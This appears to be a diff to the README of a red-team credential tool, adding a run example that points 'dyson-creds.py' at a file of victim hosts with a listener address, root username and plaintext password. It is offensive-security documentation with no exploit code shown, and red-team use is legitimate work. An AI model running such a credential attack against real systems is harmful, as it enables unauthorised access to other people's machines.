@@ -31,3 +31,8 @@ This tool is supposed to be used early in red team engagements as a means of per
 192.168.X.136:22
 192.168.X.137:2222
 ```
+
+Run:
+```
+python3 dyson-creds.py -lh <LOCAL_HOST> -lp <LOCAL_PORT> -v assets/victims.txt -s 101 102 103 -u root -p M33tQu0t@
+```
